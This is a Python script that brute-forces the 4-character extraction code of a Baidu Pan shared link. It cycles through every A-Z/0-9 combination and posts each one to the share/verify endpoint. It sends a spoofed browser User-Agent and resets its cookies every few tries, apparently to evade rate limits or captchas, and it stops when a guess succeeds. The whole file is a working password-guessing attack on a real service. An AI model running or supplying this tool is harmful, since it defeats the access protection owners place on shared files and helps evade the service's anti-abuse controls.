#!/usr/bin/env python3

import json
import time
import requests

# 变量
urlid = "i56CzmH"
pwd = "AAAA"


# 提交密码返回结果
def submit(pwd):
    datamod['pwd'] = pwd
    res = s.post(url, params=urlmode, data=datamod)
    res = res.json()['errno']
    print(f'{pwd}:{res}')
    if res == 0:
        exit()


# 获取下一个密码
def getNextPwd(pwd):
    # A-Z 0-9
    for i in range(3, -1, -1):
        if pwd[i] is '9':
            # 9999
            if i is 0:
                return None
            pwd = pwd[:i] + 'A' + pwd[i+1:]
        elif pwd[i] is 'Z':
            pwd = pwd[:i] + '0' + pwd[i+1:]
            break
        else:
            tmpc = chr(ord(pwd[i]) + 1)
            pwd = pwd[:i] + tmpc + pwd[i+1:]
            break
    return pwd


# 规范化密码
def formatPwd(pwd):
    # 长度不符合要求
    if len(pwd) != 4:
        return None
    pwd = pwd.upper()
    for i in range(4):
        if pwd[i].isdigit() or pwd[i].isalpha():
            continue
        pwd[i] = 'A'
    return pwd


# 清除 cookies 并重新获取
def regetCookies():
    s.cookies.clear()
    res = s.get(f"https://pan.baidu.com/share/init?surl={urlid}")


# 新建会话
s = requests.Session()
# 设置请求 headers 伪装浏览器操作
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)\
    Chrome/65.0.3325.146 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Referer': f'https://pan.baidu.com/share/init?surl={urlid}',
})
# 初始化请求URL的参数
urlmode = {
    "surl": urlid,
    "t": int(time.time()),
    "channel": "chunlei",
    "web": 1,
    "app_id": "250528",
    "bdstoken": "null",
    "logid": "MTUyNTE0OTMzODIwMzAuMzc2MTM5ODg1ODg3ODc5OTQ",
    "clienttype": 0,
}
url = 'https://pan.baidu.com/share/verify'
# 提交密码的Form表单
datamod = {
    "pwd": "AAAA",
    "vcode": "",
    "vcode_str": "",
}

pwd = formatPwd(pwd)
# 如果密码不符合规则
if pwd is None:
    exit()
# 开始遍历查询
# 是否需要重新获取 cookies 的标志
tmp = 3
while pwd is not None:
    if tmp == 3:
        regetCookies()
        tmp = 0
    tmp += 1
    submit(pwd)
    pwd = getNextPwd(pwd)
